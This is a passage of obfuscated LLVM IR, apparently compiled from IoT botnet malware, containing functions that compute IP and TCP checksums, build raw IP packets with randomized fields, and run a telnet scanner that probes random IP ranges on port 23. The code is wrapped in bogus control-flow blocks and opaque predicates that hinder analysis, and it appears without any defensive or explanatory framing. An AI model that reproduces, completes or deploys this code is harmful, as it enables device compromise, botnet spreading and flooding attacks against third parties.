  %65 = mul i32 %62, %64
  %66 = urem i32 %65, 2
  %67 = icmp eq i32 %66, 0
  %68 = icmp slt i32 %63, 10
  %69 = or i1 %67, %68
  br i1 %69, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %61
  %70 = load i64, i64* %13, align 8
  %71 = lshr i64 %70, 16
  %72 = icmp ne i64 %71, 0
  %73 = load i32, i32* @x.61
  %74 = load i32, i32* @y.62
  %75 = sub i32 %73, 1
  %76 = mul i32 %73, %75
  %77 = urem i32 %76, 2
  %78 = icmp eq i32 %77, 0
  %79 = icmp slt i32 %74, 10
  %80 = or i1 %78, %79
  br i1 %80, label %originalBBpart215, label %originalBB6alteredBB

originalBBpart215:                                ; preds = %originalBB6
  br i1 %72, label %81, label %103

; <label>:81:                                     ; preds = %originalBBpart215
  %82 = load i32, i32* @x.61
  %83 = load i32, i32* @y.62
  %84 = sub i32 %82, 1
  %85 = mul i32 %82, %84
  %86 = urem i32 %85, 2
  %87 = icmp eq i32 %86, 0
  %88 = icmp slt i32 %83, 10
  %89 = or i1 %87, %88
  br i1 %89, label %originalBB17, label %originalBB17alteredBB

originalBB17:                                     ; preds = %originalBB17alteredBB, %81
  %90 = load i64, i64* %13, align 8
  %91 = and i64 %90, 65535
  %92 = load i64, i64* %13, align 8
  %93 = lshr i64 %92, 16
  %94 = add i64 %91, %93
  store i64 %94, i64* %13, align 8
  %95 = load i32, i32* @x.61
  %96 = load i32, i32* @y.62
  %97 = sub i32 %95, 1
  %98 = mul i32 %95, %97
  %99 = urem i32 %98, 2
  %100 = icmp eq i32 %99, 0
  %101 = icmp slt i32 %96, 10
  %102 = or i1 %100, %101
  br i1 %102, label %originalBBpart257, label %originalBB17alteredBB

originalBBpart257:                                ; preds = %originalBB17
  br label %61

; <label>:103:                                    ; preds = %originalBBpart215
  %104 = load i32, i32* @x.61
  %105 = load i32, i32* @y.62
  %106 = sub i32 %104, 1
  %107 = mul i32 %104, %106
  %108 = urem i32 %107, 2
  %109 = icmp eq i32 %108, 0
  %110 = icmp slt i32 %105, 10
  %111 = or i1 %109, %110
  br i1 %111, label %originalBB59, label %originalBB59alteredBB

originalBB59:                                     ; preds = %originalBB59alteredBB, %103
  %112 = load i64, i64* %13, align 8
  %113 = xor i64 %112, -1
  %114 = trunc i64 %113 to i16
  %115 = load i32, i32* @x.61
  %116 = load i32, i32* @y.62
  %117 = sub i32 %115, 1
  %118 = mul i32 %115, %117
  %119 = urem i32 %118, 2
  %120 = icmp eq i32 %119, 0
  %121 = icmp slt i32 %116, 10
  %122 = or i1 %120, %121
  br i1 %122, label %originalBBpart263, label %originalBB59alteredBB

originalBBpart263:                                ; preds = %originalBB59
  ret i16 %114

originalBBalteredBB:                              ; preds = %originalBB, %2
  %123 = alloca i16*, align 8
  %124 = alloca i32, align 4
  %125 = alloca i64, align 8
  store i16* %0, i16** %123, align 8
  store i32 %1, i32* %124, align 4
  store i64 0, i64* %125, align 8
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %37
  %126 = load i16*, i16** %11, align 8
  %127 = bitcast i16* %126 to i8*
  %128 = load i8, i8* %127, align 1
  %129 = zext i8 %128 to i64
  %130 = load i64, i64* %13, align 8
  %_ = shl i64 %130, %129
  %_2 = shl i64 %130, %129
  %131 = add i64 %130, %129
  store i64 %131, i64* %13, align 8
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %61
  %132 = load i64, i64* %13, align 8
  %_7 = sub i64 %132, 16
  %gen = mul i64 %_7, 16
  %_8 = sub i64 0, %132
  %gen9 = add i64 %_8, 16
  %_10 = sub i64 %132, 16
  %gen11 = mul i64 %_10, 16
  %_12 = sub i64 %132, 16
  %gen13 = mul i64 %_12, 16
  %133 = lshr i64 %132, 16
  %134 = icmp ne i64 %133, 0
  br label %originalBB6

originalBB17alteredBB:                            ; preds = %originalBB17, %81
  %135 = load i64, i64* %13, align 8
  %_18 = shl i64 %135, 65535
  %_19 = shl i64 %135, 65535
  %_20 = sub i64 %135, 65535
  %gen21 = mul i64 %_20, 65535
  %_22 = sub i64 %135, 65535
  %gen23 = mul i64 %_22, 65535
  %_24 = sub i64 0, %135
  %gen25 = add i64 %_24, 65535
  %136 = and i64 %135, 65535
  %137 = load i64, i64* %13, align 8
  %_26 = sub i64 %137, 16
  %gen27 = mul i64 %_26, 16
  %_28 = sub i64 %137, 16
  %gen29 = mul i64 %_28, 16
  %_30 = sub i64 0, %137
  %gen31 = add i64 %_30, 16
  %_32 = sub i64 %137, 16
  %gen33 = mul i64 %_32, 16
  %_34 = shl i64 %137, 16
  %_35 = sub i64 0, %137
  %gen36 = add i64 %_35, 16
  %_37 = sub i64 %137, 16
  %gen38 = mul i64 %_37, 16
  %_39 = sub i64 0, %137
  %gen40 = add i64 %_39, 16
  %138 = lshr i64 %137, 16
  %_41 = sub i64 %136, %138
  %gen42 = mul i64 %_41, %138
  %_43 = sub i64 %136, %138
  %gen44 = mul i64 %_43, %138
  %_45 = sub i64 %136, %138
  %gen46 = mul i64 %_45, %138
  %_47 = sub i64 0, %136
  %gen48 = add i64 %_47, %138
  %_49 = sub i64 0, %136
  %gen50 = add i64 %_49, %138
  %_51 = shl i64 %136, %138
  %_52 = shl i64 %136, %138
  %_53 = shl i64 %136, %138
  %_54 = sub i64 0, %136
  %gen55 = add i64 %_54, %138
  %139 = add i64 %136, %138
  store i64 %139, i64* %13, align 8
  br label %originalBB17

originalBB59alteredBB:                            ; preds = %originalBB59, %103
  %140 = load i64, i64* %13, align 8
  %_60 = shl i64 %140, -1
  %_61 = shl i64 %140, -1
  %141 = xor i64 %140, -1
  %142 = trunc i64 %141 to i16
  br label %originalBB59
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr*, %struct.tcphdr*) #0 {
  %3 = load i32, i32* @x.63
  %4 = load i32, i32* @y.64
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca %struct.iphdr*, align 8
  %12 = alloca %struct.tcphdr*, align 8
  %13 = alloca %struct.tcp_pseudo, align 8
  %14 = alloca i16, align 2
  %15 = alloca i32, align 4
  %16 = alloca i16*, align 8
  %17 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %11, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %12, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %11, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 2
  %20 = load i16, i16* %19, align 2
  store i16 %20, i16* %14, align 2
  %21 = load %struct.iphdr*, %struct.iphdr** %11, align 8
  %22 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %21, i32 0, i32 8
  %23 = load i32, i32* %22, align 4
  %24 = zext i32 %23 to i64
  %25 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %13, i32 0, i32 0
  store i64 %24, i64* %25, align 8
  %26 = load %struct.iphdr*, %struct.iphdr** %11, align 8
  %27 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %26, i32 0, i32 9
  %28 = load i32, i32* %27, align 4
  %29 = zext i32 %28 to i64
  %30 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %13, i32 0, i32 1
  store i64 %29, i64* %30, align 8
  %31 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %13, i32 0, i32 2
  store i8 0, i8* %31, align 8
  %32 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %13, i32 0, i32 3
  store i8 6, i8* %32, align 1
  %33 = call zeroext i16 @htons(i16 zeroext 20) #10
  %34 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %13, i32 0, i32 4
  store i16 %33, i16* %34, align 2
  store i32 44, i32* %15, align 4
  %35 = load i32, i32* %15, align 4
  %36 = sext i32 %35 to i64
  %37 = call noalias i8* @malloc(i64 %36) #5
  %38 = bitcast i8* %37 to i16*
  store i16* %38, i16** %16, align 8
  %39 = load i16*, i16** %16, align 8
  %40 = bitcast i16* %39 to i8*
  %41 = bitcast %struct.tcp_pseudo* %13 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %40, i8* %41, i64 24, i32 1, i1 false)
  %42 = load i16*, i16** %16, align 8
  %43 = bitcast i16* %42 to i8*
  %44 = getelementptr inbounds i8, i8* %43, i64 24
  %45 = load %struct.tcphdr*, %struct.tcphdr** %12, align 8
  %46 = bitcast %struct.tcphdr* %45 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %44, i8* %46, i64 20, i32 1, i1 false)
  %47 = load i16*, i16** %16, align 8
  %48 = load i32, i32* %15, align 4
  %49 = call zeroext i16 @csum(i16* %47, i32 %48)
  store i16 %49, i16* %17, align 2
  %50 = load i16*, i16** %16, align 8
  %51 = bitcast i16* %50 to i8*
  call void @free(i8* %51) #5
  %52 = load i16, i16* %17, align 2
  %53 = load i32, i32* @x.63
  %54 = load i32, i32* @y.64
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i16 %52

originalBBalteredBB:                              ; preds = %originalBB, %2
  %61 = alloca %struct.iphdr*, align 8
  %62 = alloca %struct.tcphdr*, align 8
  %63 = alloca %struct.tcp_pseudo, align 8
  %64 = alloca i16, align 2
  %65 = alloca i32, align 4
  %66 = alloca i16*, align 8
  %67 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %61, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %62, align 8
  %68 = load %struct.iphdr*, %struct.iphdr** %61, align 8
  %69 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %68, i32 0, i32 2
  %70 = load i16, i16* %69, align 2
  store i16 %70, i16* %64, align 2
  %71 = load %struct.iphdr*, %struct.iphdr** %61, align 8
  %72 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %71, i32 0, i32 8
  %73 = load i32, i32* %72, align 4
  %74 = zext i32 %73 to i64
  %75 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %63, i32 0, i32 0
  store i64 %74, i64* %75, align 8
  %76 = load %struct.iphdr*, %struct.iphdr** %61, align 8
  %77 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %76, i32 0, i32 9
  %78 = load i32, i32* %77, align 4
  %79 = zext i32 %78 to i64
  %80 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %63, i32 0, i32 1
  store i64 %79, i64* %80, align 8
  %81 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %63, i32 0, i32 2
  store i8 0, i8* %81, align 8
  %82 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %63, i32 0, i32 3
  store i8 6, i8* %82, align 1
  %83 = call zeroext i16 @htons(i16 zeroext 20) #10
  %84 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %63, i32 0, i32 4
  store i16 %83, i16* %84, align 2
  store i32 44, i32* %65, align 4
  %85 = load i32, i32* %65, align 4
  %86 = sext i32 %85 to i64
  %87 = call noalias i8* @malloc(i64 %86) #5
  %88 = bitcast i8* %87 to i16*
  store i16* %88, i16** %66, align 8
  %89 = load i16*, i16** %66, align 8
  %90 = bitcast i16* %89 to i8*
  %91 = bitcast %struct.tcp_pseudo* %63 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %90, i8* %91, i64 24, i32 1, i1 false)
  %92 = load i16*, i16** %66, align 8
  %93 = bitcast i16* %92 to i8*
  %94 = getelementptr inbounds i8, i8* %93, i64 24
  %95 = load %struct.tcphdr*, %struct.tcphdr** %62, align 8
  %96 = bitcast %struct.tcphdr* %95 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %94, i8* %96, i64 20, i32 1, i1 false)
  %97 = load i16*, i16** %66, align 8
  %98 = load i32, i32* %65, align 4
  %99 = call zeroext i16 @csum(i16* %97, i32 %98)
  store i16 %99, i16* %67, align 2
  %100 = load i16*, i16** %66, align 8
  %101 = bitcast i16* %100 to i8*
  call void @free(i8* %101) #5
  %102 = load i16, i16* %67, align 2
  br label %originalBB
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #2

; Function Attrs: noinline nounwind uwtable
define void @makeIPPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  %11 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %12 = bitcast %struct.iphdr* %11 to i8*
  %13 = load i8, i8* %12, align 4
  %14 = and i8 %13, -16
  %15 = or i8 %14, 5
  store i8 %15, i8* %12, align 4
  %16 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %17 = bitcast %struct.iphdr* %16 to i8*
  %18 = load i8, i8* %17, align 4
  %19 = and i8 %18, 15
  %20 = or i8 %19, 64
  store i8 %20, i8* %17, align 4
  %21 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %22 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %21, i32 0, i32 1
  store i8 0, i8* %22, align 1
  %23 = load i32, i32* %10, align 4
  %24 = sext i32 %23 to i64
  %25 = add i64 20, %24
  %26 = trunc i64 %25 to i16
  %27 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %28 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %27, i32 0, i32 2
  store i16 %26, i16* %28, align 2
  %29 = call i32 @rand_cmwc()
  %30 = trunc i32 %29 to i16
  %31 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %32 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %31, i32 0, i32 3
  store i16 %30, i16* %32, align 4
  %33 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %34 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %33, i32 0, i32 4
  store i16 0, i16* %34, align 2
  %35 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %36 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %35, i32 0, i32 5
  store i8 -1, i8* %36, align 4
  %37 = load i8, i8* %9, align 1
  %38 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %39 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %38, i32 0, i32 6
  store i8 %37, i8* %39, align 1
  %40 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %41 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %40, i32 0, i32 7
  store i16 0, i16* %41, align 2
  %42 = load i32, i32* %8, align 4
  %43 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %44 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %43, i32 0, i32 8
  store i32 %42, i32* %44, align 4
  %45 = load i32, i32* %7, align 4
  %46 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %47 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %46, i32 0, i32 9
  store i32 %45, i32* %47, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) #0 {
  %2 = load i32, i32* @x.67
  %3 = load i32, i32* @y.68
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  store i32 %0, i32* %11, align 4
  %12 = load i32, i32* %11, align 4
  %13 = icmp sgt i32 3, %12
  %14 = load i32, i32* @x.67
  %15 = load i32, i32* @y.68
  %16 = sub i32 %14, 1
  %17 = mul i32 %14, %16
  %18 = urem i32 %17, 2
  %19 = icmp eq i32 %18, 0
  %20 = icmp slt i32 %15, 10
  %21 = or i1 %19, %20
  br i1 %21, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %13, label %22, label %23

; <label>:22:                                     ; preds = %originalBBpart2
  store i32 1, i32* %10, align 4
  br label %26

; <label>:23:                                     ; preds = %originalBBpart2
  %24 = load i32, i32* %11, align 4
  %25 = call i32 @close(i32 %24)
  store i32 0, i32* %10, align 4
  br label %26

; <label>:26:                                     ; preds = %23, %22
  %27 = load i32, i32* %10, align 4
  ret i32 %27

originalBBalteredBB:                              ; preds = %originalBB, %1
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  store i32 %0, i32* %29, align 4
  %30 = load i32, i32* %29, align 4
  %31 = icmp sgt i32 3, %30
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define void @TelnetScanner(i32, i32) #0 {
  %3 = load i32, i32* @x.69
  %4 = load i32, i32* @y.70
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca [128 x i8], align 16
  %19 = alloca i8, align 1
  %20 = alloca %struct.fd_set, align 8
  %21 = alloca %struct.timeval, align 8
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca [256 x i8], align 16
  %25 = alloca i8*, align 8
  %26 = alloca %struct.sockaddr_in, align 4
  %27 = alloca i8*, align 8
  %28 = alloca i8*, align 8
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca [80 x i8], align 16
  store i32 %0, i32* %11, align 4
  store i32 %1, i32* %12, align 4
  %32 = call i32 @getdtablesize() #5
  %33 = sub nsw i32 %32, 100
  store i32 %33, i32* %13, align 4
  %34 = load i32, i32* %13, align 4
  %35 = load i32, i32* %12, align 4
  %36 = icmp sgt i32 %34, %35
  %37 = load i32, i32* @x.69
  %38 = load i32, i32* @y.70
  %39 = sub i32 %37, 1
  %40 = mul i32 %37, %39
  %41 = urem i32 %40, 2
  %42 = icmp eq i32 %41, 0
  %43 = icmp slt i32 %38, 10
  %44 = or i1 %42, %43
  br i1 %44, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %36, label %45, label %63

; <label>:45:                                     ; preds = %originalBBpart2
  %46 = load i32, i32* @x.69
  %47 = load i32, i32* @y.70
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %45
  %54 = load i32, i32* %12, align 4
  store i32 %54, i32* %13, align 4
  %55 = load i32, i32* @x.69
  %56 = load i32, i32* @y.70
  %57 = sub i32 %55, 1
  %58 = mul i32 %55, %57
  %59 = urem i32 %58, 2
  %60 = icmp eq i32 %59, 0
  %61 = icmp slt i32 %56, 10
  %62 = or i1 %60, %61
  br i1 %62, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %63

; <label>:63:                                     ; preds = %originalBBpart24, %originalBBpart2
  %64 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %26, i32 0, i32 0
  store i16 2, i16* %64, align 4
  %65 = call zeroext i16 @htons(i16 zeroext 23) #10
  %66 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %26, i32 0, i32 1
  store i16 %65, i16* %66, align 2
  %67 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %26, i32 0, i32 3
  %68 = getelementptr inbounds [8 x i8], [8 x i8]* %67, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %68, i8 0, i64 8, i32 4, i1 false)
  %69 = call noalias i8* @malloc(i64 1025) #5
  store i8* %69, i8** %25, align 8
  %70 = load i8*, i8** %25, align 8
  call void @llvm.memset.p0i8.i64(i8* %70, i8 0, i64 1025, i32 1, i1 false)
  %71 = load i32, i32* %13, align 4
  %72 = zext i32 %71 to i64
  %73 = call i8* @llvm.stacksave()
  store i8* %73, i8** %27, align 8
  %74 = alloca %struct.telstate_t, i64 %72, align 16
  %75 = bitcast %struct.telstate_t* %74 to i8*
  %76 = load i32, i32* %13, align 4
  %77 = sext i32 %76 to i64
  %78 = mul i64 %77, 5
  call void @llvm.memset.p0i8.i64(i8* %75, i8 0, i64 %78, i32 16, i1 false)
  store i32 0, i32* %14, align 4
  br label %79

; <label>:79:                                     ; preds = %129, %63
  %80 = load i32, i32* @x.69
  %81 = load i32, i32* @y.70
  %82 = sub i32 %80, 1
  %83 = mul i32 %80, %82
  %84 = urem i32 %83, 2
  %85 = icmp eq i32 %84, 0
  %86 = icmp slt i32 %81, 10
  %87 = or i1 %85, %86
  br i1 %87, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %79
  %88 = load i32, i32* %14, align 4
  %89 = load i32, i32* %13, align 4
  %90 = icmp slt i32 %88, %89
  %91 = load i32, i32* @x.69
  %92 = load i32, i32* @y.70
  %93 = sub i32 %91, 1
  %94 = mul i32 %91, %93
  %95 = urem i32 %94, 2
  %96 = icmp eq i32 %95, 0
  %97 = icmp slt i32 %92, 10
  %98 = or i1 %96, %97
  br i1 %98, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %90, label %99, label %132

; <label>:99:                                     ; preds = %originalBBpart28
  %100 = load i32, i32* @x.69
  %101 = load i32, i32* @y.70
  %102 = sub i32 %100, 1
  %103 = mul i32 %100, %102
  %104 = urem i32 %103, 2
  %105 = icmp eq i32 %104, 0
  %106 = icmp slt i32 %101, 10
  %107 = or i1 %105, %106
  br i1 %107, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %99
  %108 = load i32, i32* %14, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %109
  %111 = bitcast %struct.telstate_t* %110 to i8*
  call void @llvm.memset.p0i8.i64(i8* %111, i8 0, i64 32, i32 16, i1 false)
  %112 = load i32, i32* %14, align 4
  %113 = sext i32 %112 to i64
  %114 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %113
  %115 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %114, i32 0, i32 3
  store i8 1, i8* %115, align 1
  %116 = load i8*, i8** %25, align 8
  %117 = load i32, i32* %14, align 4
  %118 = sext i32 %117 to i64
  %119 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %118
  %120 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %119, i32 0, i32 9
  store i8* %116, i8** %120, align 8
  %121 = load i32, i32* @x.69
  %122 = load i32, i32* @y.70
  %123 = sub i32 %121, 1
  %124 = mul i32 %121, %123
  %125 = urem i32 %124, 2
  %126 = icmp eq i32 %125, 0
  %127 = icmp slt i32 %122, 10
  %128 = or i1 %126, %127
  br i1 %128, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %129

; <label>:129:                                    ; preds = %originalBBpart212
  %130 = load i32, i32* %14, align 4
  %131 = add nsw i32 %130, 1
  store i32 %131, i32* %14, align 4
  br label %79

; <label>:132:                                    ; preds = %originalBBpart28
  br label %133

; <label>:133:                                    ; preds = %originalBBpart2195, %132
  br label %134

; <label>:134:                                    ; preds = %133
  store i32 0, i32* %14, align 4
  br label %135

; <label>:135:                                    ; preds = %1509, %134
  %136 = load i32, i32* %14, align 4
  %137 = load i32, i32* %13, align 4
  %138 = icmp slt i32 %136, %137
  br i1 %138, label %139, label %1512

; <label>:139:                                    ; preds = %135
  %140 = load i32, i32* %14, align 4
  %141 = sext i32 %140 to i64
  %142 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %141
  %143 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %142, i32 0, i32 7
  %144 = load i32, i32* %143, align 16
  %145 = icmp eq i32 %144, 0
  br i1 %145, label %146, label %153

; <label>:146:                                    ; preds = %139
  %147 = call i64 @time(i64* null) #5
  %148 = trunc i64 %147 to i32
  %149 = load i32, i32* %14, align 4
  %150 = sext i32 %149 to i64
  %151 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %150
  %152 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %151, i32 0, i32 7
  store i32 %148, i32* %152, align 16
  br label %153

; <label>:153:                                    ; preds = %146, %139
  %154 = load i32, i32* @x.69
  %155 = load i32, i32* @y.70
  %156 = sub i32 %154, 1
  %157 = mul i32 %154, %156
  %158 = urem i32 %157, 2
  %159 = icmp eq i32 %158, 0
  %160 = icmp slt i32 %155, 10
  %161 = or i1 %159, %160
  br i1 %161, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %153
  %162 = load i32, i32* %14, align 4
  %163 = sext i32 %162 to i64
  %164 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %163
  %165 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %164, i32 0, i32 2
  %166 = load i8, i8* %165, align 8
  %167 = zext i8 %166 to i32
  %168 = load i32, i32* @x.69
  %169 = load i32, i32* @y.70
  %170 = sub i32 %168, 1
  %171 = mul i32 %168, %170
  %172 = urem i32 %171, 2
  %173 = icmp eq i32 %172, 0
  %174 = icmp slt i32 %169, 10
  %175 = or i1 %173, %174
  br i1 %175, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  switch i32 %167, label %1492 [
    i32 0, label %176
    i32 1, label %424
    i32 2, label %641
    i32 3, label %741
    i32 4, label %834
    i32 5, label %918
    i32 6, label %979
    i32 7, label %1191
    i32 8, label %1235
  ]

; <label>:176:                                    ; preds = %originalBBpart216
  %177 = load i32, i32* @x.69
  %178 = load i32, i32* @y.70
  %179 = sub i32 %177, 1
  %180 = mul i32 %177, %179
  %181 = urem i32 %180, 2
  %182 = icmp eq i32 %181, 0
  %183 = icmp slt i32 %178, 10
  %184 = or i1 %182, %183
  br i1 %184, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %176
  %185 = load i32, i32* %14, align 4
  %186 = sext i32 %185 to i64
  %187 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %186
  %188 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %187, i32 0, i32 3
  %189 = load i8, i8* %188, align 1
  %190 = zext i8 %189 to i32
  %191 = icmp eq i32 %190, 1
  %192 = load i32, i32* @x.69
  %193 = load i32, i32* @y.70
  %194 = sub i32 %192, 1
  %195 = mul i32 %192, %194
  %196 = urem i32 %195, 2
  %197 = icmp eq i32 %196, 0
  %198 = icmp slt i32 %193, 10
  %199 = or i1 %197, %198
  br i1 %199, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %191, label %200, label %220

; <label>:200:                                    ; preds = %originalBBpart220
  %201 = load i32, i32* %14, align 4
  %202 = sext i32 %201 to i64
  %203 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %202
  %204 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %203, i32 0, i32 9
  %205 = load i8*, i8** %204, align 8
  store i8* %205, i8** %28, align 8
  %206 = load i32, i32* %14, align 4
  %207 = sext i32 %206 to i64
  %208 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %207
  %209 = bitcast %struct.telstate_t* %208 to i8*
  call void @llvm.memset.p0i8.i64(i8* %209, i8 0, i64 32, i32 16, i1 false)
  %210 = load i8*, i8** %28, align 8
  %211 = load i32, i32* %14, align 4
  %212 = sext i32 %211 to i64
  %213 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %212
  %214 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %213, i32 0, i32 9
  store i8* %210, i8** %214, align 8
  %215 = call i32 @TelnetIPRanges()
  %216 = load i32, i32* %14, align 4
  %217 = sext i32 %216 to i64
  %218 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %217
  %219 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %218, i32 0, i32 1
  store i32 %215, i32* %219, align 4
  br label %300

; <label>:220:                                    ; preds = %originalBBpart220
  %221 = load i32, i32* %14, align 4
  %222 = sext i32 %221 to i64
  %223 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %222
